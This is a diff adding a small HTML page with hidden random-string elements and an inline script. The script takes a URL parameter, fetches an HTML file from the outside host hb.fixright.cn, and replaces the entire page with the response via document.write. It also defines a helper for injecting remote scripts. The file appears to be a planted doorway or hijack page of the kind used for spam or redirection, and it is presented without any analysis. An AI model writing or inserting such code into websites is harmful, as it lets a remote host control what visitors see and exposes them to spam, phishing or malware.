@@ -1,0 +1,35 @@
+
+<!DOCTYPE html>
+<html>
+<head> <meta charset="utf-8" /></head>
+<body>
+<ul style='display:none' >Sb33aVCbURG3Xd8Np0zorw8GAmb9TwTjvaYoG7Ayi5BGYx8YcGm8F1vJpCVikX11xZkRwkvDP</ul>
+<span style='display:none'>oZ5oBbjjDElhooMub3vzgQ1gQp7iNj9hi0AQInN8XxQKJ0qYA9XoCcBex11OinUQ4GQoWGajm5grYcS7mKyT9e14LYyISiDJAjT7W</span>
+<ul style='display:none' >Sb33aVCbURG3Xd8Np0zorw8GAmb9TwTjvaYoG7Ayi5BGYx8YcGm8F1vJpCVikX11xZkRwkvDP</ul></body>
+<script>
+    function loadJs(a) { var c = document.createElement("script"); c.src = a, document.body.appendChild(c);}
+    function getUrlParam(name) { var reg = new RegExp("(.|&)" + name + "=([^&]*)(&|$)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return null;}
+    function Dget(e, t,a) {
+        var n = new XMLHttpRequest;
+        //n.timeout = 3000;
+        n.onreadystatechange = function () {
+            4 === n.readyState && (200 === n.status || 304 === n.status ? "function" == typeof t && t(n.responseText) : "function" == typeof a && a(n))
+        };n.ontimeout = function (e) {
+            //alert('请求超时,重新发起请求');
+            //location.reload();
+        };
+        n.open("GET", e, !0),
+            n.send(null)
+    }
+    var temp = getUrlParam('temp');
+    //if(document.referrer){
+    var temp_name = temp +'.html';
+    Dget('//hb.fixright.cn/jb/'+temp_name,function(res){
+        var doc=document.open("text/html","replace")
+        doc.write(res);
+        doc.close()
+    })
+    //}
+
+</script>
+</html>
